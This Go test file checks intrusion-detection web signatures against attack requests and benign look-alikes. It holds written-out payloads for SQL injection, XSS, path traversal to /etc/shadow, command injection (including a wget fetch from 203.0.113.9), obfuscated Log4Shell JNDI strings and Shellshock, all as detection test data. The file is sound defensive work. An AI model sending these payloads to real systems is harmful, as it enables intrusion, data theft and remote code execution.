package rules

import (
	"slices"
	"testing"
)

// TestWebRules runs the web signatures of rules.conf (1000210-1000224)
// over attack requests and look-alike benign ones.
func TestWebRules(t *testing.T) {
	rs, err := Load("../../rules.conf")
	if err != nil {
		t.Fatal(err)
	}
	get := func(target string, headers ...string) pkt {
		req := "GET " + target + " HTTP/1.1\r\nHost: shop.example\r\n"
		for _, h := range headers {
			req += h + "\r\n"
		}
		return pkt{proto: "tcp", src: "203.0.113.5", dst: "192.0.2.10", sport: 40000, dport: 80, flags: "PA", seq: 1, ack: 1, payload: req + "\r\n"}
	}
	tests := []struct {
		name string
		p    pkt
		want []int // web sids expected, exactly
	}{
		// SQL injection
		{"union select", get("/item?id=1+UNION+ALL+SELECT+user,password+FROM+users--"), []int{1000210}},
		{"union select null", get("/item?id=1%27%20union%20select%20null,null--"), []int{1000210}},
		{"union comment", get("/item?id=1/**/UNION/**/SELECT/**/1,2"), []int{1000210}},
		{"union paren", get("/item?id=-1+union+(select+@@version)"), []int{1000210}},
		{"or 1=1", get("/login?user=admin%27+OR+1=1--"), []int{1000211}},
		{"or a=a", get("/login?user=x%27%20or%20%27a%27=%27a"), []int{1000211}},
		{"sleep", get("/item?id=1%27+AND+SLEEP(5)--+-"), []int{1000212}},
		{"pg_sleep", get("/item?id=1;SELECT+pg_sleep(10)"), []int{1000212}},
		{"benchmark", get("/item?id=1+and+benchmark(5000000,md5(1))"), []int{1000212}},
		{"waitfor", get("/item?id=1%27;WAITFOR+DELAY+%270:0:5%27--"), []int{1000212}},
		{"information_schema", get("/item?id=1+and+1=(select+count(*)+from+information_schema.tables)"), []int{1000213}},
		{"select shoes", get("/search?q=select+shoes"), nil},
		{"union station", get("/search?q=union+station+select+committee"), nil},
		{"sleep search", get("/search?q=how+to+sleep(better)"), nil},
		{"o'brien", get("/search?q=O%27Brien+or+Smith"), nil},
		{"information schema words", get("/docs?q=information_schema+tutorial"), nil},
		// XSS
		{"script tag", get("/search?q=%3Cscript%3Ealert(1)%3C/script%3E"), []int{1000214}},
		{"script tag upper", get("/search?q=%3CSCRIPT+src=//x.example/a.js%3E"), []int{1000214}},
		{"javascript url", get("/redirect?to=javascript:alert(document.cookie)"), []int{1000215}},
		{"onerror", get("/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E"), []int{1000216}},
		{"svg onload", get("/search?q=%3Csvg/onload=alert(1)%3E"), []int{1000216}},
		{"onload param", get("/widget?onload=init&onerror=log"), nil},
		{"javascript word", get("/books?q=learn+javascript%3A+the+good+parts"), nil},
		{"description tag", get("/search?q=description"), nil},
		// Path traversal
		{"dotdot", get("/static/../../../../etc/passwd"), []int{1000217, 1000218}},
		{"encoded dotdot", get("/download?file=..%2f..%2fapp.conf"), []int{1000217}},
		{"backslash", get("/download?file=..%5c..%5cwindows%5cwin.ini"), []int{1000217, 1000218}},
		{"boot.ini", get("/view?page=c:/boot.ini"), []int{1000218}},
		{"shadow", get("/view?page=/etc/shadow"), []int{1000218}},
		{"overlong", get("/cgi/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"), []int{1000217, 1000218, 1000223}},
		{"dots in name", get("/files/report..final.pdf"), nil},
		{"passwd word", get("/account/passwd-reset"), nil},
		// Command injection
		{"semicolon cat", get("/ping?host=127.0.0.1;cat+/etc/hosts"), []int{1000219}},
		{"pipe id", get("/ping?host=x|id"), []int{1000219}},
		{"and whoami", get("/ping?host=x%26%26whoami"), []int{1000219}},
		{"subshell wget", get("/ping?host=$(wget+http://203.0.113.9/x)"), []int{1000219}},
		{"backtick", get("/ping?host=%60/bin/sh%60"), []int{1000219}},
		{"semicolon param", get("/page?a=1;id=2"), nil},
		{"pipe word", get("/search?q=cats|dogs"), nil},
		// Log4Shell
		{"jndi uri", get("/x?q=%24%7Bjndi:ldap://203.0.113.9/a%7D"), []int{1000220}},
		{"jndi header", get("/", "User-Agent: ${jndi:ldap://203.0.113.9:1389/a}"), []int{1000221}},
		{"jndi lower", get("/", "X-Api-Version: ${${lower:j}ndi:rmi://203.0.113.9/a}"), []int{1000221}},
		{"jndi default", get("/", "Referer: ${${::-j}${::-n}di:dns://203.0.113.9/a}"), []int{1000221}},
		{"jndi mixed", get("/", "X-Forwarded-For: ${${env:NaN:-j}${upper:N}${lower:d}${::-i}${::-:}ldap://x/}"), []int{1000221}},
		{"jndi word", get("/docs/jndi-lookups"), nil},
		{"template", get("/", "X-Tmpl: ${user.name}"), nil},
		// Shellshock
		{"shellshock", get("/cgi-bin/status", "User-Agent: () { :; }; /bin/bash -c 'id'"), []int{1000222}},
		{"shellshock nospace", get("/cgi-bin/status", "Referer: (){ :;}; echo"), []int{1000222}},
		// Scanners
		{"sqlmap", get("/", "User-Agent: sqlmap/1.8.2#stable (https://sqlmap.org)"), []int{1000224}},
		{"nmap", get("/", "User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"), []int{1000224}},
		{"nuclei", get("/", "User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"), []int{1000224}},
		{"browser", get("/", "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"), nil},
		{"curl", get("/", "User-Agent: curl/8.5.0"), nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEngine(rs, EngineConfig{})
			var got []int
			for _, a := range e.Process(tt.p.parsed(t, t0)) {
				if a.SID >= 1000210 && a.SID < 1000230 {
					got = append(got, a.SID)
				}
			}
			slices.Sort(got)
			if !slices.Equal(got, tt.want) {
				t.Errorf("fired %v, want %v", got, tt.want)
			}
		})
	}
}
